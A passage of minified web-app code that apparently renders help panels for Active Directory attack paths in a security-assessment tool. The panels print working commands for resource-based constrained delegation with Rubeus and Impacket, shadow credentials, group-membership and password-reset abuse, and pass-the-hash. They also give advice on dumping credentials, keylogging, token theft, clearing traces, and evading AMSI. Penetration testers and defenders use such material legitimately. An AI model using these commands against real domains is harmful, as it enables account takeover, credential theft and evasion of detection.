msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object."}),e.jsx(t,{variant:"body2",children:'If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.'}),e.jsx(t,{variant:"body2",children:'One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'})]}),Rs=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}),Os=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."})]}),$s=()=>e.jsx(t,{variant:"body2",children:"To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection."}),Is=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",children:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota"})]}),Ms={general:Ds,windowsAbuse:Rs,linuxAbuse:Os,opsec:$s,references:Is},Gs=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(t,{variant:"body2",children:[k(r,n),' the ability to write to the "msds-KeyCredentialLink" property on ',a,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.']}),Es=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse this privilege, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"||r==="Computer"?`${n} if you are not running a process as that user/computer`:`a member of ${n} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."})]}),Fs=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}),Us=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing the attack will generate a 5136 (A directory object was modified) event at the domain controller if an appropriate SACL is in place on the target object."}),e.jsx(t,{variant:"body2",children:"If PKINIT is not common in the environment, a 4768 (Kerberos authentication ticket (TGT) was requested) ticket can also expose the attacker."})]}),_s=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/eladshamir/Whisker",children:"https://github.com/eladshamir/Whisker"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",children:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"})]}),Ls={general:Gs,windowsAbuse:Es,linuxAbuse:Fs,opsec:Us,references:_s},Ws=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the ability to add arbitrary principals, including"," ",r==="Group"?"themselves":"itself",", to the group ",a,". Because of security group delegation, the members of a security group have the same privileges as that group."]}),e.jsxs(t,{variant:"body2",children:["By adding itself to the group, ",n," will gain the same privileges that ",a," already has."]})]}),zs=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsx(t,{variant:"body2",children:"To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as"," ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]}),Bs=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replaced with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]}),Ns=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),e.jsx(t,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity."}),e.jsx(t,{variant:"body2",children:"You may be able to completely evade those features by downgrading to PowerShell v2."})]}),Vs=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"})]}),Ks={general:Ws,windowsAbuse:zs,linuxAbuse:Bs,opsec:Ns,references:Vs},Hs=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the ability to add"," ",r==="Group"?"themselves":"itself",", to the group ",a,". Because of security group delegation, the members of a security group have the same privileges as that group."]}),e.jsxs(t,{variant:"body2",children:["By adding itself to the group, ",n," will gain the same privileges that ",a," already has."]})]}),qs=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console."," "]}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as"," ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]}),Ys=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]}),Js=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),e.jsx(t,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity."}),e.jsx(t,{variant:"body2",children:"You may be able to completely evade those features by downgrading to PowerShell v2."})]}),Xs=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl#bloodhound-edges",children:"https://www.thehacker.recipes/ad/movement/dacl#bloodhound-edges"})]}),Qs={general:Hs,windowsAbuse:qs,linuxAbuse:Ys,opsec:Js,references:Xs},Zs=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Lateral movement"}),e.jsx(t,{variant:"body2",children:`There are several ways to pivot to a Windows system. If using Cobalt Strike's beacon, check the help info for the commands "psexec", "psexec_psh", "wmi", and "winrm". With Empire, consider the modules for Invoke-PsExec, Invoke-DCOM, and Invoke-SMBExec. With Metasploit, consider the modules "exploit/windows/smb/psexec", "exploit/windows/winrm/winrm_script_exec", and "exploit/windows/local/ps_wmi_exec". With Impacket, consider the example scripts psexec/wmiexec/smbexec/atexec/dcomexec. There are other alternatives like evil-winrm and crackmapexec. Additionally, there are several manual methods for remotely executing code on the machine, including via RDP, with the service control binary and interaction with the remote machine's service control manager, and remotely instantiating DCOM objects. For more information about these lateral movement techniques, see the References tab.`}),e.jsx(t,{variant:"body1",children:"Gathering credentials"}),e.jsx(t,{variant:"body2",children:"The most well-known tool for gathering credentials from a Windows system is mimikatz. mimikatz is built into several agents and toolsets, including Cobalt Strike's beacon, Empire, and Meterpreter. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system."}),e.jsx(t,{variant:"body2",children:`You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's "keyscan_start" command to start keylogging a user, then "keyscan_dump" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard.`}),e.jsx(t,{variant:"body1",children:"Token Impersonation"}),e.jsx(t,{variant:"body2",children:"You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab."}),e.jsx(t,{variant:"body1",children:"Disabling host-based security controls"}),e.jsx(t,{variant:"body2",children:"Several host-based controls may affect your ability to execute certain techniques, such as credential theft, process injection, command line execution, and writing files to disk. Administrators can often disable these host-based controls in various ways, such as stopping or otherwise disabling a service, unloading a driver, or making registry key changes. For more information, see the References tab."})]}),ei=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," admin rights to the computer ",a,"."]}),e.jsx(t,{variant:"body2",children:"By default, administrators have several ways to perform remote code execution on Windows systems, including via RDP, WMI, WinRM, the Service Control Manager, and remote DCOM execution."}),e.jsx(t,{variant:"body2",children:"Further, administrators have several options for impersonating other users logged onto the system, including plaintext password extraction, token impersonation, and injecting into processes running as another user."}),e.jsx(t,{variant:"body2",children:"Finally, administrators can often disable host-based security controls that would otherwise prevent the aforementioned techniques."})]}),ti=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several forensic artifacts generated by the techniques described above. For instance, lateral movement via PsExec will generate 4697 events on the target system. If the target organization is collecting and analyzing those events, they may very easily detect lateral movement via PsExec."}),e.jsx(t,{variant:"body2",children:"Additionally, an EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when abusing administrator privileges. For more information, see the References tab."})]}),ni=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(t,{variant:"body1",children:"Lateral movement"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Lateral_Movement",children:"https://attack.mitre.org/wiki/Lateral_Movement"}),e.jsx(t,{variant:"body1",children:"Gathering Credentials"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://blog.gentilkiwi.com/mimikatz",children:"http://blog.gentilkiwi.com/mimikatz"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/gentilkiwi/mimikatz",children:"https://github.com/gentilkiwi/mimikatz"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?page_id=1821",children:"https://adsecurity.org/?page_id=1821"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Credential_Access",children:"https://attack.mitre.org/wiki/Credential_Access"}),e.jsx(t,{variant:"body1",children:"Token Impersonation"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf",children:"https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Technique/T1134",children:"https://attack.mitre.org/wiki/Technique/T1134"}),e.jsx(t,{variant:"body1",children:"Disabling host-based security controls"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/",children:"https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/",children:"https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/"}),e.jsx(t,{variant:"body1",children:"Opsec Considerations"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/",children:"https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/"})]}),ri={general:ei,abuse:Zs,opsec:ti,references:ni},oi=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the AllExtendedRights privilege to the"," ",I(s),a,"."]}),e.jsx(t,{variant:"body2",children:"Extended rights are special rights granted on objects which allow reading of privileged attributes, as well as performing special actions."})]}),ai=({sourceName:n,sourceType:r,targetName:a,targetType:s,haslaps:i})=>{switch(s){case"User":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," the ability to change the password of the user ",a,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]});case"Computer":return i?e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," the ability to obtain the RID 500 administrator password of ",a,". ",n," can do so by listing a computer object's AD properties with PowerView using Get-DomainComputer ",a,". The value of the ms-mcs-AdmPwd property will contain password of the administrative local account on"," ",a,"."]}),e.jsx(t,{variant:"body2",children:"Alternatively, AllExtendedRights on a computer object can be used to perform a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"AllExtendedRights on a computer object can be used to perform a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 